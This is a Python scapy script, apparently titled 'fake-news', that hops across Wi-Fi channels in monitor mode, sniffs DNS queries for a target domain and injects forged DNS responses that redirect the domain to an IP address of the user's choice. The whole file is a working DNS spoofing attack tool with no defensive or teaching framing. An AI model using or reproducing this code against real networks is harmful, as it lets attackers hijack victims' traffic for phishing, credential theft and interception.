#!/usr/bin/python3

import os
import sys
import time
import shutil
import threading
from scapy.all import *
from scapy.config import conf
from argparse import ArgumentParser

if os.getuid() != 0:
    print('[-] This script doesn\'t work if you don\'t run it as root!')
    os._exit(1)

def print_delim(sym: str = '=') -> None:
    print('='*shutil.get_terminal_size().columns)

def hop_to(iface: str, ch: int) -> None:
    os.system(f'iwconfig {iface} channel {ch}')
    print(f'[*] Switched to channel {ch} ... ')

hop = True
def hopper(iface: str) -> None:
    ch = 1
    while hop:
        time.sleep(.5)
        hop_to(iface, ch)
        ch = max((ch+1)%14, 1)

def fake(p: scapy.packet.Packet, spoof: str) -> None:
    req_d = p[DNS].qd.qname

    res = p.copy()
    res.FCfield = 2
    res.addr1, res.addr2 = res.addr2, res.addr1
    res.src, res.dst = res.dst, res.src
    res.sport, res.dport = res.dport, res.sport

    res[DNS].qr = 1
    res[DNS].ra = 1
    res[DNS].ancount = 1

    res[DNS].an = DNSRR(
        rrname=req_d,
        # type='A',
        # rclass='IN',
        ttl=10,
        rdata=spoof
    )

    print('='*64)
    print(p.summary())
    print(res.summary())
    print('='*64)
    sendp(res)

def main() -> None:
    global hop

    print_delim()
    print('''    ,...                                                                          
  .d' ""       `7MM                                                               
  dM`            MM                                                               
 mMMmm ,6"Yb.    MM  ,MP'.gP"Ya      `7MMpMMMb.  .gP"Ya `7M'    ,A    `MF',pP"Ybd 
  MM  8)   MM    MM ;Y  ,M'   Yb       MM    MM ,M'   Yb  VA   ,VAA   ,V  8I   `" 
  MM   ,pm9MM    MM;Mm  8M"""""" mmmmm MM    MM 8M""""""   VA ,V  VA ,V   `YMMMa. 
  MM  8M   MM    MM `Mb.YM.    ,       MM    MM YM.    ,    VVV    VVV    L.   I8 
.JMML.`Moo9^Yo..JMML. YA.`Mbmmd'     .JMML  JMML.`Mbmmd'     W      W     M9mmmP' ''')
    print_delim()

    parser = ArgumentParser()
    parser.add_argument('domain', type=str, help='The domain name you want to spoof ... ')
    parser.add_argument('spoof', type=str, help='The IP address you want to rediret to instead ... ')
    parser.add_argument('-i', '--iface', type=str, help='The name of your wireless interface (in monitoring mode) ... ', default=conf.iface)
    parser.add_argument('-c', '--channel', type=int, help='Specify the channel you want to listen on ... ')
    args = parser.parse_args()

    if not args.domain.endswith('.'):
        args.domain += '.'

    if not args.channel:
        t = threading.Thread(target=hopper, args=(args.iface,))
        print('[*] Starting channel hopping ... ')
        t.start()
    else:
        hop_to(args.iface, args.channel)

    print('[*] Starting to sniff ... ')
    sniff(prn=lambda p: fake(p, args.spoof), iface=args.iface, lfilter=lambda p: DNS in p and p.haslayer(DNSQR) and p[DNS].qd.qname == args.domain.encode())

    if not args.channel:
        print('[*] Stopping channel hopping ... ')
        hop = False
        t.join()

if __name__ == '__main__':
    main()
